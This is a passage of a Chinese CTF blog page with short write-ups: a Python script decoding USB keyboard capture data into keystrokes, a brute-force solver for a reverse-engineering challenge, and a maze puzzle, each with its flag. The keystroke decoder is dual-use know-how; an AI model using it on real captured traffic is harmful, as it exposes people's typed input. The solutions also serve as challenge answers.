class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(line)!=<span class="number">17</span>: <span class="comment">#首先过滤掉鼠标等其他设备的USB流量</span></span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    nums.append(line[<span class="number">0</span>:<span class="number">2</span>]+line[<span class="number">4</span>:<span class="number">6</span>]) <span class="comment">#取一、三字节</span></span><br><span class="line">keys.close()</span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n[<span class="number">2</span>:<span class="number">4</span>] == <span class="string">&quot;00&quot;</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> n[<span class="number">2</span>:<span class="number">4</span>] <span class="keyword">in</span> normalKeys:</span><br><span class="line">        <span class="keyword">if</span> n[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">&quot;02&quot;</span>: <span class="comment">#表示按下了shift</span></span><br><span class="line">            output += shiftKeys [n[<span class="number">2</span>:<span class="number">4</span>]]</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            output += normalKeys [n[<span class="number">2</span>:<span class="number">4</span>]]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">&#x27;[unknown]&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;output :n&#x27;</span> + output)</span><br></pre></td></tr></table></figure>
+
+<p>得到关键部分</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">output :n[unknown][unknown][unknown][unknown][unknown]bcfgijjjighfedcaa[unknown][unknown][unknown][unknown]bacfedca[unknown][unknown]7200&lt;DEL&gt;53&lt;DEL&gt;93[unknown][unknown][unknown][unknown][unknown][unknown][unknown][unknown]</span><br></pre></td></tr></table></figure>
+
+<p>ppsuc{720593}</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/20/4-20%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="STEVE">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="STERIA LAB">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/04/20/4-20%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">4.20刷题笔记</a>
+        </h2>
+
+        <div class="post-meta">
+
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-04-20 18:25:26 / 修改时间：18:49:44" itemprop="dateCreated datePublished" datetime="2021-04-20T18:25:26+08:00">2021-04-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeups/" itemprop="url" rel="index"><span itemprop="name">writeups</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeups/reverse/" itemprop="url" rel="index"><span itemprop="name">reverse</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="SimpleRev"><a href="#SimpleRev" class="headerlink" title="SimpleRev"></a>SimpleRev</h3><p>定位关键函数,反汇编:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">Decry</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> input_char; <span class="comment">// [rsp+Fh] [rbp-51h]</span></span><br><span class="line">  <span class="keyword">int</span> input_len; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-4Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">int</span> key_len; <span class="comment">// [rsp+1Ch] [rbp-44h]</span></span><br><span class="line">  <span class="keyword">char</span> src[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *src = <span class="string">&#x27;SLCDN&#x27;</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="string">&#x27;wodah&#x27;</span>;</span><br><span class="line">  v10 = <span class="number">0LL</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  text = join(key3, &amp;v9);                       <span class="comment">// killshadow</span></span><br><span class="line">  <span class="built_in">strcpy</span>(key, key1);</span><br><span class="line">  <span class="built_in">strcat</span>(key, src);                             <span class="comment">// ADSFKNDCLS</span></span><br><span class="line">  input_len = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  getchar();</span><br><span class="line">  key_len = <span class="built_in">strlen</span>(key);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; key_len; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( key[v3 % key_len] &gt; <span class="string">&#x27;@&#x27;</span> &amp;&amp; key[v3 % key_len] &lt;= <span class="string">&#x27;Z&#x27;</span> )</span><br><span class="line">      key[i] = key[v3 % key_len] + <span class="number">32</span>;</span><br><span class="line">    ++v3;</span><br><span class="line">  &#125;                                             <span class="comment">// 转小写</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input your flag:&quot;</span>, src);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    input_char = getchar();</span><br><span class="line">    <span class="keyword">if</span> ( input_char == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( input_char == <span class="string">&#x27; &#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++input_len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( input_char &lt;= <span class="string">&#x27;`&#x27;</span> || input_char &gt; <span class="string">&#x27;z&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( input_char &gt; <span class="string">&#x27;@&#x27;</span> &amp;&amp; input_char &lt;= <span class="string">&#x27;Z&#x27;</span> )</span><br><span class="line">          str2[input_len] = (input_char - <span class="number">39</span> - key[v3++ % key_len] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        str2[input_len] = (input_char - <span class="number">39</span> - key[v3++ % key_len] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !(v3 % key_len) )</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">32</span>);</span><br><span class="line">      ++input_len;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(text, str2) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Congratulation!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v12;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>爆破flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">lt = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span> <span class="comment"># 这里是爆破的列表</span></span><br><span class="line">key = <span class="built_in">list</span>(<span class="string">&#x27;ADSFKNDCLS&#x27;</span>.lower()) <span class="comment"># 根据程序的初始化,先转化成小写</span></span><br><span class="line">key_len = <span class="built_in">len</span>(key) </span><br><span class="line">str2 = <span class="string">&#x27;killshadow&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>    <span class="comment"># 定义一个空字符串放dlag</span></span><br><span class="line"><span class="keyword">for</span> input_len <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str2)): <span class="comment"># 还原源程序关键for循环</span></span><br><span class="line">    <span class="keyword">for</span> input_char <span class="keyword">in</span> lt: <span class="comment"># 爆破</span></span><br><span class="line">        <span class="keyword">if</span> str2[input_len] == <span class="built_in">chr</span>((<span class="built_in">ord</span>(input_char) - <span class="number">39</span> - <span class="built_in">ord</span>(key[input_len % key_len]) + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>): </span><br><span class="line">            flag += input_char <span class="comment"># 直接将反汇编复制,替换变量,注意所有字符先转换为整型,计算完再换回字符</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span>+flag+<span class="string">&#x27;&#125;&#x27;</span>) <span class="comment"># 输出</span></span><br></pre></td></tr></table></figure>
+
+<p>flag{KLDQCUDFZO}</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/18/4-18%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="STEVE">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="STERIA LAB">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/04/18/4-18%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">4.18刷题笔记</a>
+        </h2>
+
+        <div class="post-meta">
+
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-04-18 22:04:55 / 修改时间：22:12:40" itemprop="dateCreated datePublished" datetime="2021-04-18T22:04:55+08:00">2021-04-18</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeups/" itemprop="url" rel="index"><span itemprop="name">writeups</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeups/reverse/" itemprop="url" rel="index"><span itemprop="name">reverse</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="不一样的flag"><a href="#不一样的flag" class="headerlink" title="不一样的flag"></a>不一样的flag</h2><ul>
+<li>关键字符串<code>*11110100001010000101111#</code>,<code>you can choose one action to execute``&quot;1 up&quot;&quot;2 down&quot;&quot;3 left&quot;&quot;4 right&quot;</code></li>
+<li>注意到字符串是25位,正好是一个5x5阵</li>
+<li>可以联想到地图的题目</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*1111</span><br><span class="line">01000</span><br><span class="line">01010</span><br><span class="line">00010</span><br><span class="line">1111#</span><br></pre></td></tr></table></figure>
+
+<p>flag{222441144222}</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/16/%E9%93%BE%E6%8E%A5%EF%BC%8C%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="STEVE">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="STERIA LAB">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/04/16/%E9%93%BE%E6%8E%A5%EF%BC%8C%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/" class="post-title-link" itemprop="url">链接，装载与库</a>
+        </h2>
+
+        <div class="post-meta">
+
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-04-16 22:06:56" itemprop="dateCreated datePublished" datetime="2021-04-16T22:06:56+08:00">2021-04-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-10-15 16:03:22" itemprop="dateModified" datetime="2021-10-15T16:03:22+08:00">2021-10-15</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>程序员的自我修养——链接、装载与库，笔记</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/04/16/%E9%93%BE%E6%8E%A5%EF%BC%8C%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+  </nav>
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="STEVE"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">STEVE</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">34</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; Mon Apr 05 2021 08:00:00 GMT+0800 (中国标准时间) – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">STEVE</span>
+</div>
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
+    <span class="post-meta-divider">|</span>
+<!-- 不蒜子计数初始值纠正 -->
+<script>
